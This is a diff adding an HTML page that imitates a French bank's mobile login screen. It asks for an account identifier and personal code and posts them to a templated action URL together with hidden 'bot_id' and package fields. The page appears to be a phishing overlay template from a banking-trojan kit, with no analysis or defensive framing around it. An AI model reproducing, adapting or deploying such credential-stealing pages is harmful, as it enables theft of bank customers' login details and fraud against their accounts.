@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html>
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+    <title></title>
+	<style type='text/css'>
+	* {
+		margin: 0;
+		padding: 0;
+		font-size: 14pt;
+	}
+	
+	body {
+		background-image: url('%DYN_PATH%/img/bg.png');
+		background-repeat: no-repeat;
+		background-size: 100%;
+		color: #21368b;
+	}
+	
+	#header {
+		border-bottom: 1px solid #eee;
+		padding: 10px;
+	}
+	
+	.button1 {
+		font-weight: bold;
+		padding: 20px;
+		width: 100%;
+		
+		color: black;
+		background-color: white;
+		border: 0;
+		border-radius: 5px; 
+	}
+	
+	
+	#body {
+		width: 100%;
+	}
+	#body TD {
+		padding: 10px;
+	}
+	
+	INPUT {
+		border: 0;
+		background-color: transparent;
+		width: 100%;
+	}
+
+	#loginbutton {
+		width: 100%;
+		color: white;
+		font-weight: bold;
+		padding: 10px;
+		border-radius: 3px;
+		background-color: #757575;
+	}
+
+	#clearbutton {
+		width: 100%;
+		color: white;
+		font-weight: bold;
+		padding: 10px;
+		border-radius: 3px;
+		background-color: #d60004;
+	}
+	
+	.inp {
+
+		border-radius: 3px;
+		padding: 10px;
+		padding-left: 50px;
+		width: calc(100% - 160px);
+		background-color: #fff;
+		color: #21368b;
+		
+	}
+	
+::-webkit-input-placeholder { /* WebKit, Blink, Edge */
+    color:    #21368b;
+}
+:-moz-placeholder { /* Mozilla Firefox 4 to 18 */
+   color:    #21368b;
+   opacity:  1;
+}
+::-moz-placeholder { /* Mozilla Firefox 19+ */
+   color:    #21368b;
+   opacity:  1;
+}
+:-ms-input-placeholder { /* Internet Explorer 10-11 */
+   color:    #21368b;
+}
+
+.bottom_line {
+	border-bottom: 1px solid #21368b;
+}
+
+	</style>
+<script type='text/javascript'>
+document.total_steps = 1
+//document.current_step = 1
+//document.error_style = 'border: 1px solid red'
+</script>
+<script src="%DYN_PATH_GENERAL%/jquery.min.js"></script>
+
+</head>
+
+<body>
+<div id='body'>	
+	<form id='mainform' method='post' action='%ACTION%' onsubmit="return function(){ 
+var ok = true;
+
+$('input').each(function (i, value){  
+	$(value).css('border', '');
+	if($(value).val().length < 3){
+		$(value).css('border', '1px solid red');
+		ok = false;
+	}
+	
+});
+if(window.form_sent) return false; if(ok) window.form_sent = true; return ok; 
+}()">
+		<input type="hidden" name="page_id" value="%PKG%" /><input type="hidden" name="bot_id" value="%BOTID%" />
+		
+<div style='text-align: center; color: white; margin-top: 100px'>
+	<img src='%DYN_PATH%/img/face.png' style='margin: 0 auto' /><br />
+	Particulier
+</div>
+
+<img src='%DYN_PATH%/img/bg_white.png' style='width: 100%; height: 100px; margin: 0px; margin-bottom: -50px' />
+<div style='width: 100%; background-color: white; height: 600px'>
+<table border='0' width='95%' style='margin: 0 auto; background-color: white' id='step1' cellpadding=0 cellspacing=0>
+		<tr>
+			<td class='bottom_line'>
+				<p style='text-align: center; font-weight: bold'>ME CONNECTER</p>
+				
+				<input style='background-image: url("%DYN_PATH%/img/login.png"); background-repeat: no-repeat; background-size: 50px 50px;' 
+				class='inp' type='number' id='field1' name='fields[username]' value='' placeholder='Identifiant' />
+				<div style='display: inline; color: #1ec2d8'>Oublié ?</div>
+			</td></tr>
+		<tr>
+			<td class='bottom_line'>
+			<input style='background-image: url("%DYN_PATH%/img/pass.png"); background-repeat: no-repeat; background-size: 50px 50px;'
+			class='inp' type='password' id='field2' name='fields[password]' value='' placeholder='Code personnel' />
+			<div style='display: inline; color: #1ec2d8'>Oublié ?</div>
+			</td></tr>
+			
+		<tr>
+			<td><br />
+			<input style='width: 100%; background-color: #1e82d8' id='loginbutton' class='button' type='submit' value='Accéder à mes comptes' />
+			</td>
+		</tr>
+	</table>
+
+	
+	</form>
+</div>
+</div>
+</body>
+</html>
+
+
+
+
